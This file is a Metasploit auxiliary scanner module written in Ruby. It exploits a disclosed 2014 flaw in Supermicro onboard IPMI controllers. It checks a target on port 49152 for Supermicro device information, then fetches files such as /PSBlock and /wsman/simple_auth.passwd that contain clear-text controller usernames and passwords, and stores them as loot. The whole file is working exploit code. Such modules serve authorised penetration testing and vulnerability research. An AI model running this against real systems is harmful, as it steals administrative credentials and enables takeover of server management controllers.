##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report


  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Supermicro Onboard IPMI Port 49152 Sensitive File Exposure',
      'Description' => %q{
        This module abuses a file exposure vulnerability accessible through the web interface
        on port 49152 of Supermicro Onboard IPMI controllers.  The vulnerability allows an attacker
        to obtain detailed device information and download data files containing the clear-text
        usernames and passwords for the controller. In May of 2014, at least 30,000 unique IPs
        were exposed to the internet with this vulnerability.
      },
      'Author'       =>
        [
          'Zach Wikholm <kestrel[at]trylinux.us>', # Discovery and analysis
          'John Matherly <jmath[at]shodan.io>',    # Internet-wide scan
          'Dan Farmer <zen[at]fish2.com>',         # Additional investigation
          'hdm'                                    # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/'],
          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
        ],
      'DisclosureDate' => 'Jun 19 2014'))

    register_options(
      [
        Opt::RPORT(49152)
      ])
  end

  def is_supermicro?
    res = send_request_cgi(
      {
        "uri"       => "/IPMIdevicedesc.xml",
        "method"    => "GET"
      })

    if res && res.code == 200 && res.body.to_s =~ /supermicro/i
      path = store_loot(
        'supermicro.ipmi.devicexml',
        'text/xml',
        rhost,
        res.body.to_s,
        'IPMIdevicedesc.xml'
      )
      print_good("Stored the device description XML in #{path}")
      return true
    else
      return false
    end
  end


  def run_host(ip)

    unless is_supermicro?
      vprint_error("This does not appear to be a Supermicro IPMI controller")
      return
    end

    candidates = %W{ /PSBlock /PSStore /PMConfig.dat /wsman/simple_auth.passwd }

    candidates.each do |uri|
      res = send_request_cgi(
        {
          "uri"       => uri,
          "method"    => "GET"
        })

      next unless res

      unless res.code == 200 && res.body.length > 0
        vprint_status("Request for #{uri} resulted in #{res.code}")
        next
      end

      path = store_loot(
        'supermicro.ipmi.passwords',
        'application/octet-stream',
        rhost,
        res.body.to_s,
        uri.split('/').last
      )
      print_good("Password data from #{uri} stored to #{path}")
    end
  end
end
